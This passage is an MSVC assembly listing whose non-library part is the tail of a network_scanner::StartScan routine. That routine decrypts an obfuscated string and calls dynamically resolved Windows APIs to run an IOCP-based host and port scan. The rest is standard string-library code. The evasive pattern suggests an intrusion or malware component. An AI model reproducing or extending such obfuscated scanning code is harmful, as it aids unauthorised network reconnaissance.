	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@
  00246	48 8d 8d f8 04
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  0024d	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
  00252	48 8b c8	 mov	 rcx, rax
  00255	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
  0025a	48 8b c8	 mov	 rcx, rax
  0025d	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 673  : 		goto cleanup;

  00262	eb 45		 jmp	 SHORT $LN20@StartScan
  00264	eb 43		 jmp	 SHORT $cleanup$26
$LN19@StartScan:

; 674  : 
; 675  : 	}
; 676  : 
; 677  : 	pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);

  00266	45 33 c9	 xor	 r9d, r9d
  00269	41 b8 01 00 00
	00		 mov	 r8d, 1
  0026f	33 d2		 xor	 edx, edx
  00271	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  00278	e8 00 00 00 00	 call	 ?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ; pPostQueuedCompletionStatus

; 678  : 	pWaitForSingleObject(hPortScan, INFINITE);

  0027d	ba ff ff ff ff	 mov	 edx, -1			; ffffffffH
  00282	48 8b 8d e8 01
	00 00		 mov	 rcx, QWORD PTR hPortScan$[rbp]
  00289	e8 00 00 00 00	 call	 ?pWaitForSingleObject@@YAKPEAXK@Z ; pWaitForSingleObject

; 679  : 
; 680  : 	AddHost(STOP_MARKER);

  0028e	b9 ff ff ff ff	 mov	 ecx, -1			; ffffffffH
  00293	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost

; 681  : 	pWaitForSingleObject(hHostHandler, INFINITE);

  00298	ba ff ff ff ff	 mov	 edx, -1			; ffffffffH
  0029d	48 8b 8d c8 01
	00 00		 mov	 rcx, QWORD PTR hHostHandler$[rbp]
  002a4	e8 00 00 00 00	 call	 ?pWaitForSingleObject@@YAKPEAXK@Z ; pWaitForSingleObject
$LN12@StartScan:
$LN14@StartScan:
$LN16@StartScan:
$LN18@StartScan:
$LN20@StartScan:
$cleanup$26:

; 682  : 
; 683  : cleanup:
; 684  : 	pDeleteCriticalSection(&g_CriticalSection);

  002a9	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  002b0	e8 00 00 00 00	 call	 ?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pDeleteCriticalSection

; 685  : 	if (g_IocpHandle) {

  002b5	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_IocpHandle@@3PEAXEA, 0 ; g_IocpHandle
  002bd	74 0c		 je	 SHORT $LN21@StartScan

; 686  : 		pCloseHandle(g_IocpHandle);

  002bf	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  002c6	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle
$LN21@StartScan:

; 687  : 	}
; 688  : 	if (hHostHandler) {

  002cb	48 83 bd c8 01
	00 00 00	 cmp	 QWORD PTR hHostHandler$[rbp], 0
  002d3	74 0c		 je	 SHORT $LN22@StartScan

; 689  : 		pCloseHandle(hHostHandler);

  002d5	48 8b 8d c8 01
	00 00		 mov	 rcx, QWORD PTR hHostHandler$[rbp]
  002dc	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle
$LN22@StartScan:

; 690  : 	}
; 691  : 	if (hPortScan) {

  002e1	48 83 bd e8 01
	00 00 00	 cmp	 QWORD PTR hPortScan$[rbp], 0
  002e9	74 0c		 je	 SHORT $LN23@StartScan

; 692  : 		pCloseHandle(hPortScan);

  002eb	48 8b 8d e8 01
	00 00		 mov	 rcx, QWORD PTR hPortScan$[rbp]
  002f2	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle
$LN23@StartScan:

; 693  : 	}
; 694  : 
; 695  : 	pWSACleanup();

  002f7	e8 00 00 00 00	 call	 ?pWSACleanup@@YAHXZ	; pWSACleanup

; 696  : }

  002fc	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  00300	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?StartScan@network_scanner@@YAXXZ$rtcFrameData
  00307	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0030c	48 8b 8d 48 05
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00313	48 33 cd	 xor	 rcx, rbp
  00316	e8 00 00 00 00	 call	 __security_check_cookie
  0031b	48 8d a5 58 05
	00 00		 lea	 rsp, QWORD PTR [rbp+1368]
  00322	5f		 pop	 rdi
  00323	5d		 pop	 rbp
  00324	c3		 ret	 0
?StartScan@network_scanner@@YAXXZ ENDP			; network_scanner::StartScan
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1535 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1536 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1531 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1532 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4894 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4890 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 8
$T4 = 232
__$ArrayPad$ = 248
_Requested$ = 288
_Old$ = 296
_Max$ = 304
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 12 00 00 00	 mov	 ecx, 18
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 48
	01 00 00	 mov	 rcx, QWORD PTR [rsp+328]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 f8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00053	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Requested$[rbp]
  0005a	48 83 c8 07	 or	 rax, 7
  0005e	48 89 45 08	 mov	 QWORD PTR _Masked$[rbp], rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00062	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00069	48 39 45 08	 cmp	 QWORD PTR _Masked$[rbp], rax
  0006d	76 09		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  0006f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00076	eb 68		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00078	33 d2		 xor	 edx, edx
  0007a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  00081	b9 02 00 00 00	 mov	 ecx, 2
  00086	48 f7 f1	 div	 rcx
  00089	48 8b 8d 30 01
	00 00		 mov	 rcx, QWORD PTR _Max$[rbp]
  00090	48 2b c8	 sub	 rcx, rax
  00093	48 8b c1	 mov	 rax, rcx
  00096	48 39 85 28 01
	00 00		 cmp	 QWORD PTR _Old$[rbp], rax
  0009d	76 09		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0009f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  000a6	eb 38		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  000a8	33 d2		 xor	 edx, edx
  000aa	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  000b1	b9 02 00 00 00	 mov	 ecx, 2
  000b6	48 f7 f1	 div	 rcx
  000b9	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Old$[rbp]
  000c0	48 03 c8	 add	 rcx, rax
  000c3	48 8b c1	 mov	 rax, rcx
  000c6	48 89 85 e8 00
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cd	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  000d4	48 8d 4d 08	 lea	 rcx, QWORD PTR _Masked$[rbp]
  000d8	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  000dd	48 8b 00	 mov	 rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4771 :     }

  000e0	48 8b f8	 mov	 rdi, rax
  000e3	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000e7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData
  000ee	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000f3	48 8b c7	 mov	 rax, rdi
  000f6	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000fd	48 33 cd	 xor	 rcx, rbp
  00100	e8 00 00 00 00	 call	 __security_check_cookie
  00105	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0010c	5f		 pop	 rdi
  0010d	5d		 pop	 rbp
  0010e	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
_Alloc_max$ = 8
_Storage_max$ = 40
$T4 = 264
$T5 = 296
$T6 = 328
__$ArrayPad$ = 344
this$ = 384
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00049	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00050	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00055	48 8b c8	 mov	 rcx, rax
  00058	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  0005d	48 89 45 08	 mov	 QWORD PTR _Alloc_max$[rbp], rax

; 4167 :         const size_type _Storage_max = // can always store small string

  00061	48 c7 85 08 01
	00 00 08 00 00
	00		 mov	 QWORD PTR $T4[rbp], 8
  0006c	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  00073	48 8d 4d 08	 lea	 rcx, QWORD PTR _Alloc_max$[rbp]
  00077	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  0007c	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0007f	48 89 45 28	 mov	 QWORD PTR _Storage_max$[rbp], rax

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00083	48 8b 45 28	 mov	 rax, QWORD PTR _Storage_max$[rbp]
  00087	48 ff c8	 dec	 rax
  0008a	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00091	e8 00 00 00 00	 call	 ?max@?$numeric_limits@_J@std@@SA_JXZ ; std::numeric_limits<__int64>::max
  00096	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T6[rbp], rax
  0009d	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR $T5[rbp]
  000a4	48 8d 8d 48 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ab	e8 00 00 00 00	 call	 ??$min@_K@std@@YAAEB_KAEB_K0@Z ; std::min<unsigned __int64>
  000b0	48 8b 00	 mov	 rax, QWORD PTR [rax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  000b3	48 8b f8	 mov	 rdi, rax
  000b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData
  000c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000c6	48 8b c7	 mov	 rax, rdi
  000c9	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000d0	48 33 cd	 xor	 rcx, rbp
  000d3	e8 00 00 00 00	 call	 __security_check_cookie
  000d8	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  000df	5f		 pop	 rdi
  000e0	5d		 pop	 rbp
  000e1	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_Ptr$ = 264
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  00032	48 8b c8	 mov	 rcx, rax
  00035	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2557 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  0003a	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00041	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
  00046	48 8b c8	 mov	 rcx, rax
  00049	e8 00 00 00 00	 call	 ??$_Convert_size@_K_K@std@@YA_K_K@Z ; std::_Convert_size<unsigned __int64,unsigned __int64>
  0004e	4c 8b c0	 mov	 r8, rax
  00051	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00058	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0005f	e8 00 00 00 00	 call	 ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>

; 2558 :     }

  00064	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00072	5f		 pop	 rdi
  00073	5d		 pop	 rbp
  00074	c3		 ret	 0
